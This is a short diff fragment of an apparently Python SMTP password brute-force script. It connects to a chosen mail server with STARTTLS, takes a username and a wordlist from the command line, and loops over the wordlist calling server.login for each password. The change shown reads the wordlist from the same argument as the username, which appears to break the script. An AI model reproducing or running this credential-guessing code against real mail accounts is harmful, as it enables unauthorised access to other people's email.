@@ -53,7 +53,7 @@ elif pilihservernya == '2':
 	server.ehlo()
 	server.starttls()
 	user = sys.argv[1]
-	wordlist = open(sys.argv[2], "r")
+	wordlist = open(sys.argv[1], "r")
 	for brute in wordlist:
 	    try:
 		server.login(user, brute)
